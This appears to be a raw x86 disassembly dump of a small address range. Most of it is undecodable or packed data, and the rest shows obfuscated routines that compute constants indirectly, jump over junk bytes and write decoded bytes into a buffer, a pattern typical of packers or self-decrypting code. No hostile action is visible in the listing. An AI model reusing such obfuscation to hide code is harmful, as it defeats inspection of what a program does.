  416a4e:	add    eax,0xf673751b
  416a53:	xchg   esi,eax
  416a54:	pop    ds
  416a55:	sub    ah,BYTE PTR [ebx]
  416a57:	jmp    0xe4d28540
  416a5c:	and    edi,DWORD PTR [edx+ecx*8+0x7e]
  416a60:	and    DWORD PTR ds:0x8f0fe91,0x1c
  416a67:	xor    BYTE PTR [ecx],cl
  416a69:	ja     0x416a1c
  416a6b:	jmp    0x416ac4
  416a6d:	(bad)  
  416a6e:	fcmove st,st(7)
  416a70:	in     eax,0x3e
  416a72:	arpl   WORD PTR [esi],bx
  416a74:	xchg   ebp,eax
  416a75:	or     BYTE PTR [esi+0x7bceef2c],0x28
  416a7c:	pop    ebx
  416a7d:	inc    edi
  416a7e:	sbb    ebx,DWORD PTR [esi]
  416a80:	or     DWORD PTR [ecx+ecx*1],edx
  416a83:	add    bl,BYTE PTR [ebx+0x261068af]
  416a89:	int3   
  416a8a:	fcmovnb st,st(4)
  416a8c:	fsubr  st,st(5)
  416a8e:	paddusw mm5,QWORD PTR [esi]
  416a91:	jmp    0xc6fd91ab
  416a96:	out    0x28,al
  416a98:	ja     0x874ecf59
  416a9e:	loop   0x416a78
  416aa0:	icebp  
  416aa1:	in     al,0xed
  416aa3:	stos   DWORD PTR es:[edi],eax
  416aa4:	or     eax,0xaf686631
  416aa9:	je     0x416a90
  416aab:	repz mov ch,0x12
  416aae:	paddd  mm1,QWORD PTR [eax]
  416ab1:	xchg   ebx,eax
  416ab2:	mov    cs,WORD PTR [eax+0x40]
  416ab5:	rcr    BYTE PTR [ebx],1
  416ab7:	sti    
  416ab8:	cmp    eax,0x6c4ae0eb
  416abd:	sbb    dh,BYTE PTR [ebp+0x736dc19d]
  416ac3:	sub    al,0x62
  416ac5:	sub    cl,ah
  416ac7:	int3   
  416ac8:	jno    0x416a9a
  416aca:	inc    edi
  416acb:	mov    DWORD PTR [esp+eax*4],edi
  416ace:	mov    DWORD PTR [eax+0x18],ebx
  416ad1:	mov    edi,0xabac43bc
  416ad6:	bound  esi,QWORD PTR [eax]
  416ad8:	fadd   st(4),st
  416ada:	icebp  
  416adb:	xchg   esp,eax
  416adc:	add    eax,0x66eeae1
  416ae1:	xor    al,0xc1
  416ae3:	jmp    0x416b61
  416ae5:	mov    ds:0xfb7f42e2,eax
  416aea:	aas    
  416aeb:	push   cs
  416aec:	inc    esp
  416aed:	mov    eax,ds:0x653bf548
  416af2:	(bad)  
  416af3:	dec    ebx
  416af4:	aas    
  416af5:	std    
  416af6:	add    DWORD PTR [ebp-0x5d],0xffffff8a
  416afa:	cmp    DWORD PTR [ecx-0x80],edx
  416afd:	sbb    al,0x33
  416aff:	xor    esi,DWORD PTR [esi-0x6a]
  416b02:	cmc    
  416b03:	or     edx,DWORD PTR ds:0x66a0d8ad
  416b09:	mov    ecx,0xaab8f0b8
  416b0e:	jae    0x416adb
  416b10:	or     ebp,DWORD PTR [esi+0x1711288d]
  416b16:	mov    BYTE PTR [eax+0x3e],dl
  416b19:	fistp  DWORD PTR [edx+ecx*2]
  416b1c:	push   cs
  416b1d:	push   cs
  416b1e:	inc    esp
  416b1f:	jmp    0xb89a4139
  416b24:	cmp    eax,0x2490cb91
  416b29:	push   0x8
  416b2b:	jp     0x416b2a
  416b2d:	mov    bh,0x95
  416b2f:	xor    BYTE PTR ds:[edi-0xaaf268d],0xbf
  416b37:	mov    bl,0x34
  416b39:	into   
  416b3a:	xor    dh,BYTE PTR [eax]
  416b3c:	out    dx,eax
  416b3d:	out    dx,al
  416b3e:	gs icebp 
  416b40:	and    bh,dl
  416b42:	mov    edx,0x4b4b1443
  416b47:	ret    0xbf05
  416b4a:	loope  0x416b8c
  416b4c:	or     BYTE PTR ds:0x675919af,bh
  416b52:	int3   
  416b53:	sahf   
  416b54:	xchg   edi,eax
  416b55:	mov    ?,esi
  416b57:	mov    bl,0x5
  416b59:	jbe    0x416b2b
  416b5b:	int3   
  416b5c:	jae    0x416ba0
  416b5e:	push   es
  416b5f:	sti    
  416b60:	icebp  
  416b61:	out    dx,al
  416b62:	loopne 0x416b94
  416b64:	or     al,0x5e
  416b66:	jle    0x416b48
  416b68:	lods   eax,DWORD PTR ds:[esi]
  416b69:	mov    edi,0x65f37d6e
  416b6e:	mov    esi,eax
  416b70:	adc    eax,0x3ad2e5a5
  416b75:	aad    0x92
  416b77:	popf   
  416b78:	cmc    
  416b79:	pop    eax
  416b7a:	and    BYTE PTR [esp+eiz*8+0x2e],bl
  416b7e:	loope  0x416bd5
  416b80:	inc    edi
  416b81:	dec    ecx
  416b82:	push   esp
  416b83:	(bad)
  416b86:	or     BYTE PTR ds:0x8b345f53,ah
  416b8c:	lock jne 0x416b86
  416b8f:	mov    bl,0xd6
  416b91:	mov    dl,0xf5
  416b93:	idiv   BYTE PTR [ebp-0x7d8f5fab]
  416b99:	adc    dl,BYTE PTR [eax]
  416b9b:	jge    0x416b7b
  416b9d:	shl    esi,cl
  416b9f:	xor    eax,eax
  416ba1:	push   ds
  416ba2:	mov    al,0x4a
  416ba4:	cld    
  416ba5:	and    eax,ecx
  416ba7:	mov    edx,0x4e8bf65
  416bac:	jnp    0x416b6e
  416bae:	mov    al,ds:0xca28028c
  416bb3:	(bad)  
  416bb4:	int3   
  416bb5:	mov    edi,DWORD PTR [esi]
  416bb7:	mov    ch,0x6d
  416bb9:	adc    DWORD PTR [esi-0x63b38981],esi
  416bbf:	adc    DWORD PTR [eax+0x10],edx
  416bc2:	aad    0x8c
  416bc4:	inc    esp
  416bc5:	imul   BYTE PTR [ebp+0x51]
  416bc8:	xor    BYTE PTR [eax],bl
  416bca:	jmp    0x6503:0xc2f70d5e
  416bd1:	jecxz  0x416b6f
  416bd3:	push   eax
  416bd4:	bound  ecx,QWORD PTR [ecx]
  416bd6:	inc    ebp
  416bd7:	les    esp,FWORD PTR [edi+0x69366736]
  416bdd:	mov    edx,0xc04d0706
  416be2:	mov    al,0xb7
  416be4:	ret    
  416be5:	icebp  
  416be6:	dec    ecx
  416be7:	jmp    0x416b73
  416be9:	xor    BYTE PTR [ebx],dl
  416beb:	xor    al,0x84
  416bed:	xchg   edi,eax
  416bee:	xor    edx,edx
  416bf0:	or     eax,edx
  416bf2:	add    eax,edi
  416bf4:	push   eax
  416bf5:	shl    ecx,0x1e
  416bf8:	call   0x415231
  416bfd:	mov    eax,DWORD PTR [ebp+0x10]
  416c00:	mov    ecx,DWORD PTR [ebp+0x14]
  416c03:	shrd   eax,ecx,0x2
  416c07:	shr    ecx,0x2
  416c0a:	mov    ecx,DWORD PTR [ebp+0x10]
  416c0d:	mov    edx,DWORD PTR [ebp+0x14]
  416c10:	pop    edi
  416c11:	xor    eax,esi
  416c13:	xor    edx,edx
  416c15:	pop    esi
  416c16:	shl    ecx,0x1e
  416c19:	or     eax,edx
  416c1b:	pop    ebx
  416c1c:	leave  
  416c1d:	ret    0x10
  416c20:	or     eax,eax
  416c22:	mov    eax,DWORD PTR [esp+0x8]
  416c26:	sub    ecx,0x3e9e
  416c2c:	mov    ecx,DWORD PTR [esp+0x10]
  416c30:	or     ecx,eax
  416c32:	mov    DWORD PTR ds:0x42820f,ecx
  416c38:	mov    ecx,DWORD PTR [esp+0xc]
  416c3c:	jne    0x416c55
  416c42:	mov    eax,DWORD PTR [esp+0x4]
  416c46:	xor    DWORD PTR ds:0x42833b,0x1fc6
  416c50:	mul    ecx
  416c52:	ret    0x10
  416c55:	sub    DWORD PTR ds:0x4281eb,0x3993
  416c5f:	push   ebx
  416c60:	sbb    DWORD PTR ds:0x428263,0x3efd
  416c6a:	mul    ecx
  416c6c:	add    DWORD PTR ds:0x4282c3,0x5330
  416c76:	mov    ebx,eax
  416c78:	xor    eax,eax
  416c7a:	add    eax,DWORD PTR ds:0x4281ab
  416c80:	mov    eax,DWORD PTR [eax]
  416c82:	adc    DWORD PTR ds:0x4281ef,eax
  416c88:	mov    eax,DWORD PTR [esp+0x8]
  416c8c:	mul    DWORD PTR [esp+0x14]
  416c90:	add    ebx,eax
  416c92:	mov    eax,DWORD PTR [esp+0x8]
  416c96:	mul    ecx
  416c98:	add    edx,ebx
  416c9a:	pop    ebx
  416c9b:	ret    0x10
  416c9e:	push   ebp
  416c9f:	mov    ebp,esp
  416ca1:	sub    esp,0x44
  416ca4:	push   ebx
  416ca5:	push   esi
  416ca6:	push   edi
  416ca7:	mov    DWORD PTR [ebp-0x18],0x2
  416cae:	mov    DWORD PTR [ebp-0x14],0x29f0
  416cb5:	mov    DWORD PTR [ebp-0x10],0x3716
  416cbc:	mov    DWORD PTR [ebp-0x2c],0x4e09
  416cc3:	mov    DWORD PTR [ebp-0x28],0x4497
  416cca:	mov    DWORD PTR [ebp-0x24],0x5
  416cd1:	mov    DWORD PTR [ebp-0x20],0x2a0a
  416cd8:	mov    DWORD PTR [ebp-0x1c],0x1
  416cdf:	mov    DWORD PTR [ebp-0xc],0xce6
  416ce6:	mov    DWORD PTR [ebp-0x8],0x12b3
  416ced:	mov    DWORD PTR [ebp-0x4],0xb09
  416cf4:	mov    DWORD PTR [ebp-0x44],0x7617
  416cfb:	mov    DWORD PTR [ebp-0x40],0x721a
  416d02:	mov    DWORD PTR [ebp-0x3c],0x5151
  416d09:	mov    DWORD PTR [ebp-0x38],0x14aa
  416d10:	mov    DWORD PTR [ebp-0x34],0x5a28
  416d17:	mov    DWORD PTR [ebp-0x30],0x19a8
  416d1e:	mov    ecx,DWORD PTR [ebp-0x1c]
  416d21:	mov    eax,DWORD PTR [ebp-0x20]
  416d24:	xor    edx,edx
  416d26:	div    ecx
  416d28:	mov    ecx,DWORD PTR [ebp-0x24]
  416d2b:	xor    edx,edx
  416d2d:	mov    esi,0x1ac5
  416d32:	push   0x20
  416d34:	div    ecx
  416d36:	mov    ecx,DWORD PTR [ebp-0x28]
  416d39:	xor    edx,edx
  416d3b:	xor    eax,0x60dc
  416d40:	sub    eax,ecx
  416d42:	mov    ecx,DWORD PTR [ebp-0x2c]
  416d45:	lea    edi,[eax+ecx*1-0x6300]
  416d4c:	mov    eax,DWORD PTR [ebp-0x4]
  416d4f:	mov    ecx,DWORD PTR [ebp-0x8]
  416d52:	sub    eax,0x7721
  416d57:	xor    eax,ecx
  416d59:	mov    ecx,DWORD PTR [ebp-0xc]
  416d5c:	xor    eax,ecx
  416d5e:	or     eax,0x7bc9
  416d63:	xor    eax,0xfffff0db
  416d68:	mov    ebx,edi
  416d6a:	sub    ebx,eax
  416d6c:	jmp    0x4170a9
  416d71:	dec    ebx
  416d72:	jbe    0x416da1
  416d74:	imul   BYTE PTR [edx+ebp*4]
  416d77:	dec    ebx
  416d78:	sub    dl,dh
  416d7a:	push   0xffffffc1
  416d7c:	mov    al,0xd1
  416d7e:	aas    
  416d7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d80:	mov    esp,0x1816f47a
  416d85:	loope  0x416d99
  416d87:	sbb    BYTE PTR [eax],bl
  416d89:	mov    eax,ds:0x61e152c5
  416d8e:	sbb    BYTE PTR gs:[edx],bl
  416d91:	bound  esi,QWORD PTR [ecx-0x148885a3]
  416d97:	add    bh,dh
  416d99:	scas   eax,DWORD PTR es:[edi]
  416d9a:	mov    eax,ds:0x150e0edb
  416d9f:	cs sub al,0x43
  416da2:	int3   
  416da3:	pop    ecx
  416da4:	data16 jle 0x416d67
  416da7:	inc    ebx
  416da8:	add    eax,0x8d1eabfb
  416dad:	das    
  416dae:	sbb    ebx,esp
  416db0:	cmc    
  416db1:	push   cs
  416db2:	(bad)  
  416db3:	imul   edi,DWORD PTR [ecx],0x42
  416db6:	mov    ds:0x45e07d72,eax
  416dbb:	dec    ecx
  416dbc:	in     al,dx
  416dbd:	dec    esp
  416dbe:	test   cl,0x2a
  416dc1:	inc    eax
  416dc2:	add    DWORD PTR [ebx],ebp
  416dc4:	nop
  416dc5:	and    ebp,DWORD PTR [ecx]
  416dc7:	lods   al,BYTE PTR ds:[esi]
  416dc8:	jmp    0xf4d6:0xd52f98c3
  416dcf:	int    0x55
  416dd1:	inc    ebx
  416dd2:	adc    eax,DWORD PTR [eax-0x119de830]
  416dd8:	push   cs
  416dd9:	adc    BYTE PTR [eax],0x48
  416ddc:	inc    eax
  416ddd:	(bad)  
  416dde:	fisub  DWORD PTR [esi-0xe]
  416de1:	mov    bl,0xe9
  416de3:	ja     0x416e39
  416de5:	xor    DWORD PTR [esp+edi*8+0x48c418c4],0xffffffce
  416ded:	shr    DWORD PTR [ecx+0x31f4b2df],0xfa
  416df4:	js     0x416dbd
  416df6:	xchg   esi,eax
  416df7:	add    esp,eax
  416df9:	out    0xd9,al
  416dfb:	inc    edx
  416dfd:	imul   eax,ebx,0x4
  416e00:	test   eax,0xe836f3e8
  416e05:	and    esp,DWORD PTR [ecx+0x2f]
  416e08:	xchg   edi,eax
  416e09:	faddp  st(3),st
  416e0b:	sub    edi,eax
  416e0d:	scas   eax,DWORD PTR es:[edi]
  416e0e:	xchg   DWORD PTR [eax+0x15e5a1a3],esp
  416e14:	test   eax,0x3989dda2
  416e19:	fidivr WORD PTR [eax+0x29cf8dad]
  416e1f:	jae    0x416e86
  416e21:	shr    DWORD PTR [ebp-0x49],0xe4
  416e25:	jge    0x416e9d
  416e27:	rol    ah,1
  416e29:	mov    edx,0x894b32ed
  416e2e:	jnp    0x416e00
  416e30:	mov    ah,0xf6
  416e32:	sbb    al,0xe7
  416e34:	outs   dx,BYTE PTR ds:[esi]
  416e35:	jp     0x416e90
  416e37:	into   
  416e38:	jo     0x416ea2
  416e3a:	inc    bl
  416e3c:	jne    0x416ddf
  416e3e:	shl    BYTE PTR [ecx],cl
  416e40:	xchg   edi,eax
  416e41:	add    esi,ebp
  416e43:	shl    ebx,0x3e
  416e46:	sbb    DWORD PTR [eax-0x5686a3fd],ebp
  416e4c:	repz not BYTE PTR [bx+di]
  416e50:	sub    eax,0x17273720
  416e55:	loop   0x416e55
  416e57:	pop    eax
  416e58:	pushw  ds
  416e5a:	inc    ebp
  416e5b:	mov    cl,0xa8
  416e5d:	scas   eax,DWORD PTR es:[edi]
  416e5e:	in     eax,dx
  416e5f:	stos   BYTE PTR es:[edi],al
  416e60:	and    esp,eax
  416e62:	iret   
  416e63:	in     eax,dx
  416e64:	iret   
  416e65:	adc    eax,0x76959501
  416e6a:	int3   
  416e6b:	neg    edx
  416e6d:	or     bl,BYTE PTR es:[ebp+eax*4-0x2628721e]
  416e75:	mul    eax
  416e77:	addr16 xor ah,bl
  416e7a:	arpl   bx,dx
  416e7c:	cmp    al,0xef
  416e7e:	push   edx
  416e7f:	lods   eax,DWORD PTR ds:[esi]
  416e80:	mov    esi,0x5686b1c9
  416e85:	fmul   QWORD PTR [ecx+0x5d]
  416e88:	lods   eax,DWORD PTR ds:[esi]
  416e89:	mov    WORD PTR [edx+0x76],es
  416e8c:	pop    ds
  416e8d:	cmp    DWORD PTR [ebx],esp
  416e8f:	mov    bl,0xbf
  416e91:	push   ds
  416e92:	xor    BYTE PTR [edx],ch
  416e94:	sahf   
  416e95:	inc    esi
  416e96:	add    ebx,DWORD PTR [eax]
  416e98:	push   0x51
  416e9a:	fld    DWORD PTR [ecx-0x10]
  416e9d:	jle    0x416eca
  416e9f:	mov    BYTE PTR ds:0x563a5937,ch
  416ea5:	repz and eax,0xfb3e47f9
  416eab:	dec    ebx
  416eac:	fisubr DWORD PTR [edi-0x57]
  416eaf:	push   ecx
  416eb0:	es icebp 
  416eb2:	mov    edi,0xa7fb291a
  416eb7:	mov    edi,esi
  416eb9:	push   ebx
  416eba:	das    
  416ebb:	dec    edi
  416ebc:	pusha  
  416ebd:	pop    ebp
  416ebe:	dec    edx
  416ebf:	test   DWORD PTR [ecx+0x503418df],ebp
  416ec5:	and    eax,0x45fd7fb9
  416eca:	or     al,0xc1
  416ecc:	cmp    bh,BYTE PTR [ecx+eiz*2+0x27a1b411]
  416ed3:	test   BYTE PTR [edx+0x33],bl
  416ed6:	cmp    DWORD PTR [edi+eax*8-0xb],edi
  416eda:	xor    DWORD PTR [ebp-0x35],0x7eeb4549
  416ee1:	idiv   BYTE PTR [ebx+0x253df054]
  416ee7:	mov    BYTE PTR [edx+0x5e],bl
  416eea:	pop    DWORD PTR [ecx+esi*4-0x27]
  416eee:	clc    
  416eef:	jp     0x416f04
  416ef1:	cmp    BYTE PTR [esi-0x6c74a9d4],dl
  416ef7:	pusha  
  416ef8:	xor    BYTE PTR [ecx+0x5c34035c],ah
  416efe:	jl     0x416f19
  416f00:	in     al,0x2f
  416f02:	mov    eax,0xf159f980
  416f07:	jne    0x416ea0
  416f09:	fwait
  416f0a:	cmp    eax,eax
  416f0c:	pop    ds
  416f0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f0e:	and    ebp,DWORD PTR [ecx+0x6b1126b6]
  416f14:	in     eax,0x4b
  416f16:	push   esi
  416f17:	sbb    cl,dl
  416f19:	push   edx
  416f1a:	sbb    al,0x7c
  416f1c:	mov    ah,0xe6
  416f1e:	xchg   ebp,eax
  416f1f:	adc    eax,0xe4dc1c9
  416f24:	fisub  DWORD PTR [eax]
  416f26:	add    ebp,DWORD PTR [ecx+0x5b]
  416f29:	cmp    BYTE PTR [ecx-0x7e],dl
  416f2c:	fcmovb st,st(3)
  416f2e:	cmp    dl,BYTE PTR ds:0xa975ed48
  416f34:	sahf   
  416f35:	das    
  416f36:	jne    0x416f26
  416f38:	arpl   WORD PTR [ecx+0x48],bx
  416f3b:	daa    
  416f3c:	ss js  0x416f67
  416f3f:	ret    0x27e
  416f42:	mov    ebx,0xd32f02bb
  416f47:	sub    al,bl
  416f49:	jbe    0x416f70
  416f4b:	hlt    
  416f4c:	xchg   DWORD PTR ss:[eax+ebx*4],ecx
  416f50:	int3   
  416f51:	mov    esi,esp
  416f53:	not    ah
  416f55:	and    eax,DWORD PTR [esi-0x191ab775]
  416f5b:	rcl    edx,0xb0
  416f5e:	popa   
  416f5f:	mov    ecx,0x101a8ed6
  416f65:	adc    DWORD PTR [ecx+0xd8787ae],edx
  416f6b:	jns    0x416f51
  416f6d:	pop    ds
  416f6e:	scas   eax,DWORD PTR es:[edi]
  416f6f:	pusha  
  416f70:	xchg   dh,al
  416f72:	jp     0x416fcd
  416f74:	sub    dl,BYTE PTR [eax+0x2c]
  416f77:	jnp    0x416fd6
  416f79:	call   0x2cf4:0xeb3589a7
  416f80:	push   esi
  416f81:	xor    dl,BYTE PTR [edi+0x18]
  416f84:	and    DWORD PTR [edi-0x67],0x4f8f0ba0
  416f8b:	test   DWORD PTR [ebp+0x6a14f4b1],esp
  416f91:	scas   eax,DWORD PTR es:[edi]
  416f92:	ins    BYTE PTR es:[edi],dx
  416f93:	sub    eax,0x13f86e1d
  416f98:	pop    ss
  416f99:	imul   eax,DWORD PTR [edx-0x83a579],0xdb37541d
  416fa3:	popa   
  416fa4:	pop    esi
  416fa5:	rcr    BYTE PTR [eax+0x1],cl
  416fa8:	mul    BYTE PTR fs:[edx+0x21f699c3]
  416faf:	stos   BYTE PTR es:[edi],al
  416fb0:	sbb    eax,edx
  416fb2:	pusha  
  416fb3:	sti    
  416fb4:	add    ebx,edi
  416fb6:	mov    al,ds:0x8aae8f1c
  416fbb:	cmp    BYTE PTR [edx-0x38f89be1],dl
  416fc1:	daa    
  416fc2:	xor    ebx,ebp
  416fc4:	add    al,0xc9
  416fc6:	mov    al,0x7f
  416fc8:	fadd   QWORD PTR [edx-0x28]
  416fcb:	(bad)  
  416fcd:	inc    ebp
  416fce:	xor    DWORD PTR [edi],eax
  416fd0:	xor    cl,BYTE PTR [eax+0x7f]
  416fd3:	int    0x82
  416fd5:	shl    DWORD PTR [ebp-0x6c],cl
  416fd8:	rcr    esp,cl
  416fda:	xor    esi,DWORD PTR [esi+ebx*8]
  416fdd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416fde:	(bad)  
  416fdf:	clc    
  416fe0:	in     al,0x88
  416fe2:	or     ch,BYTE PTR [ecx+0x4d]
  416fe5:	mov    al,0x11
  416fe7:	clc    
  416fe8:	(bad)  [eax-0x4850e25]
  416fee:	into   
  416fef:	push   bp
  416ff1:	mov    ecx,0x80c2b491
  416ff6:	scas   al,BYTE PTR es:[edi]
  416ff7:	pop    ebp
  416ff8:	addr16 mov al,0x6b
  416ffb:	cmc    
  416ffc:	cli    
  416ffd:	mov    edi,0x4cadf748
  417002:	loope  0x41703d
  417004:	pop    ebx
  417005:	nop
  417006:	pop    eax
  417007:	dec    eax
  417008:	dec    esp
  417009:	adc    eax,DWORD PTR [edi+0x20203e54]
  41700f:	loope  0x417009
  417011:	dec    ecx
  417012:	sahf   
  417013:	sbb    cl,ah
  417015:	arpl   WORD PTR ds:0xb8f1528c,di
  41701b:	mov    ebp,0xa14f904b
  417020:	and    eax,0xf96dffb1
  417025:	dec    ebp
  417026:	cmp    DWORD PTR [edi],ecx
  417028:	ins    BYTE PTR es:[edi],dx
  417029:	cmp    esi,DWORD PTR [ebx+edx*1-0x336df256]
  417030:	pop    ebp
  417031:	inc    ebx
  417032:	aaa    
  417033:	pop    esp
  417034:	mov    bl,0x9f
  417036:	pop    esi
  417037:	sub    edx,0xfffffff5
  41703a:	xor    BYTE PTR ds:0x6ef423d6,dl
  417040:	out    0x23,eax
  417042:	and    eax,0x3a6fdc35
  417047:	push   ds
  417048:	xor    BYTE PTR ds:0x22a8f7cd,dl
  41704e:	or     al,0xfa
  417050:	add    BYTE PTR [edx+0x7],0x8
  417054:	mov    edx,0xd0caa1b3
  417059:	sbb    eax,0x2fc497d0
  41705e:	dec    eax
  41705f:	popf   
  417060:	in     eax,dx
  417061:	jg     0x4170b7
  417063:	jmp    0x417027
  417065:	cmp    cl,bh
  417067:	in     eax,dx
  417068:	xchg   ecx,eax
  417069:	mov    edx,ebx
  41706b:	test   DWORD PTR [esi+edi*1+0x7a9249b0],0x1fb94529
  417076:	sbb    edi,DWORD PTR [esi]
  417078:	popa   
  417079:	pop    esp
  41707a:	cmp    eax,0xbdaed112
  41707f:	xor    ch,BYTE PTR [eax+0x2fb12d74]
  417085:	inc    esi
  417086:	inc    ebx
  417088:	aas    
  417089:	cmc    
  41708a:	jmp    0xfc4e:0xaefa4e9
  417091:	repz cdq 
  417093:	mov    DWORD PTR [ebp+0x7c1818ad],0x37d91382
  41709d:	adc    BYTE PTR [edx+edi*2+0x55],dh
  4170a1:	lds    ebp,FWORD PTR [ecx-0x75]
  4170a4:	dec    edi
  4170a5:	pop    ss
  4170a6:	xlat   BYTE PTR ds:[ebx]
  4170a7:	push   ss
  4170a8:	aaa    
  4170a9:	mov    eax,DWORD PTR [ebp-0x10]
  4170ac:	mov    ecx,DWORD PTR [ebp-0x14]
  4170af:	xor    eax,ecx
  4170b1:	mov    ecx,DWORD PTR [ebp-0x18]
  4170b4:	sub    eax,esi
  4170b6:	div    ecx
  4170b8:	mov    ecx,0x211
  4170bd:	pop    edx
  4170be:	xor    eax,ecx
  4170c0:	sub    edx,eax
  4170c2:	cmp    ebx,edx
  4170c4:	ja     0x4174cb
  4170ca:	jmp    0x4170d2
  4170cf:	mov    edi,DWORD PTR [ebp-0x2c]
  4170d2:	mov    DWORD PTR [ebp-0x20],0x1aa3
  4170d9:	mov    DWORD PTR [ebp-0x24],0x52d
  4170e0:	mov    DWORD PTR [ebp-0x28],0x226c
  4170e7:	mov    DWORD PTR [ebp-0x2c],0x347d
  4170ee:	mov    eax,DWORD PTR [ebp-0x2c]
  4170f1:	mov    edx,DWORD PTR [ebp-0x28]
  4170f4:	mov    ebx,DWORD PTR [ebp-0x24]
  4170f7:	sub    eax,0x24b3
  4170fc:	imul   eax,edx
  4170ff:	xor    eax,0x74ef
  417104:	xor    edx,edx
  417106:	div    ebx
  417108:	mov    edx,DWORD PTR [ebp-0x20]
  41710b:	mov    ebx,DWORD PTR [ebp+0x8]
  41710e:	push   0x20
  417110:	and    eax,edx
  417112:	mov    edx,edi
  417114:	sub    edx,eax
  417116:	sub    edx,0x683
  41711c:	mov    DWORD PTR [ebp-0x2c],edx
  41711f:	mov    eax,DWORD PTR [ebp-0x30]
  417122:	mov    edx,DWORD PTR [ebp-0x34]
  417125:	xor    al,dl
  417127:	mov    edx,DWORD PTR [ebp-0x2c]
  41712a:	xor    al,0x58
  41712c:	and    al,0xd8
  41712e:	add    al,BYTE PTR [ebp+0xc]
  417131:	add    al,0x28
  417133:	mov    BYTE PTR [edx+ebx*1],al
  417136:	mov    eax,DWORD PTR [ebp-0x38]
  417139:	add    eax,DWORD PTR [ebp-0x3c]
  41713c:	mov    edx,DWORD PTR [ebp-0x40]
  41713f:	xor    eax,edx
  417141:	mov    edx,DWORD PTR [ebp-0x44]
  417144:	xor    eax,edx
  417146:	mov    edx,0x61f7
  41714b:	sub    edx,eax
  41714d:	mov    eax,DWORD PTR [ebp-0x4]
  417150:	add    edi,edx
  417152:	mov    edx,DWORD PTR [ebp-0x8]
  417155:	sub    eax,0x7721
  41715a:	xor    eax,edx
  41715c:	mov    edx,DWORD PTR [ebp-0xc]
  41715f:	xor    eax,edx
  417161:	or     eax,0x7bc9
  417166:	xor    eax,0xfffff0db
  41716b:	mov    DWORD PTR [ebp-0x2c],edi
  41716e:	sub    edi,eax
  417170:	mov    eax,DWORD PTR [ebp-0x10]
  417173:	mov    edx,DWORD PTR [ebp-0x14]
  417176:	mov    ebx,DWORD PTR [ebp-0x18]
  417179:	xor    eax,edx
  41717b:	xor    edx,edx
  41717d:	sub    eax,esi
  41717f:	div    ebx
  417181:	jmp    0x4174be
  417186:	in     al,0x6b
  417188:	retf   
  417189:	repnz cmp dh,BYTE PTR [ebx]
  41718c:	pushf  
  41718d:	pop    edx
  41718e:	stos   BYTE PTR es:[edi],al
  41718f:	mov    DWORD PTR [edi+0x6a],0x7c8914f0
  417196:	inc    edx
  417197:	out    dx,al
  417198:	push   ss
  417199:	sbb    cl,ah
  41719b:	adc    bl,BYTE PTR [eax]
  41719d:	sbb    BYTE PTR [esi],bl
  41719f:	in     eax,dx
  4171a0:	int    0xde
  4171a2:	imul   esi,ecx,0xffffffa6
  4171a5:	adc    esp,DWORD PTR [edx+0x2e15261f]
  4171ab:	jmp    0x4171fd
  4171ad:	push   cs
  4171ae:	or     dl,dh
  4171b0:	add    edx,DWORD PTR [ecx+0x7d660007]
  4171b6:	xor    BYTE PTR [esi],dl
  4171b8:	and    eax,0xc052c0db
  4171bd:	(bad)  
  4171be:	dec    eax
  4171bf:	jnp    0x41717c
  4171c1:	pop    edi
  4171c2:	sahf   
  4171c3:	jge    0x4171a3
  4171c5:	pop    ebx
  4171c6:	or     DWORD PTR [edx],esp
  4171c8:	inc    ebp
  4171c9:	cld    
  4171ca:	dec    edx
  4171cb:	pop    es
  4171cc:	aas    
  4171cd:	fcomp  DWORD PTR [edx+0x2]
  4171d0:	sbb    ch,BYTE PTR [ebp+0x60]
  4171d3:	jbe    0x41718f
  4171d5:	mov    ch,0xd7
  4171d7:	push   edx
  4171d8:	inc    esi
  4171d9:	outs   dx,BYTE PTR ds:[esi]
  4171da:	and    BYTE PTR [edx-0x6a233796],dl
  4171e0:	ds enter 0xccbe,0xb5
  4171e5:	ins    DWORD PTR es:[edi],dx
  4171e6:	aad    0xd0
  4171e8:	fist   WORD PTR [eax]
  4171ea:	aam    0xa2
  4171ec:	test   BYTE PTR ds:0xaccecd89,0x78
  4171f3:	mov    ebp,0x5bd89227
  4171f8:	mov    ds:0x25524726,al
  4171fd:	cmp    dh,BYTE PTR [ebx]
  4171ff:	call   0x27becf03
  417204:	dec    esi
  417205:	sbb    dl,BYTE PTR [ecx-0x5d07fbb8]
  41720b:	xchg   esi,eax
  41720c:	mov    esp,DWORD PTR [edx+0x15]
  41720f:	and    edi,DWORD PTR [ebx+0x2c]
  417212:	cmp    al,0xf5
  417214:	sub    al,0xcf
  417216:	mov    ds:0x63ea6e80,al
  41721b:	call   0x6ef474bd
  417220:	les    ebp,FWORD PTR [esp+esi*2-0x3e]
  417224:	outs   dx,DWORD PTR ds:[esi]
  417225:	xchg   ebx,eax
  417226:	push   ss
  417227:	and    esi,DWORD PTR [edi+ebp*8+0x57]
  41722b:	xor    al,0xb8
  41722d:	dec    ebx
  41722e:	xchg   ebp,eax
  41722f:	push   ecx
  417230:	clc    
  417231:	inc    esi
  417232:	loopne 0x4171bb
  417234:	pushf  
  417235:	fld    DWORD PTR [esi-0x17e0e929]
  41723b:	data16 jmp 0x7bab:0xb5e1
  417242:	fdiv   DWORD PTR [ecx]
  417244:	jns    0x4171dd
  417246:	ds sbb al,0xdd
  417249:	ret    
  41724a:	repz xor BYTE PTR [ecx],0x3c
  41724e:	sub    DWORD PTR [eax-0x3a7b3e54],esp
  417254:	inc    eax
  417255:	sti    
  417256:	sahf   
  417257:	ds in  eax,dx
  417259:	into   
  41725a:	push   esi
  41725b:	mov    edi,0x3272a1eb
  417260:	fsub   QWORD PTR [ebp-0x33]
  417263:	cld    
  417264:	sub    al,0x6f
  417266:	adc    eax,0xa47a89b8
  41726b:	sti    
  41726c:	in     al,dx
  41726d:	mov    dl,0x1f
  41726f:	(bad)  
  417270:	test   BYTE PTR [ebp+0x7722cae7],ch
  417276:	ins    DWORD PTR es:[edi],dx
  417277:	fcmovnu st,st(2)
  417279:	test   eax,0x63959cc4
  41727e:	daa    
  41727f:	and    cl,BYTE PTR [esi-0x2d]
  417282:	dec    ebp
  417283:	enter  0x1515,0xd8
  417287:	test   BYTE PTR [edi+0x150f2cda],cl
  41728d:	das    
  41728e:	aaa    
  41728f:	retf   0x8f28
  417292:	mov    ch,0xbe
  417294:	mov    ecx,0x83656d7d
  417299:	leave  
  41729a:	nop
  41729b:	pop    eax
  41729c:	stc    
  41729d:	cmp    esp,esi
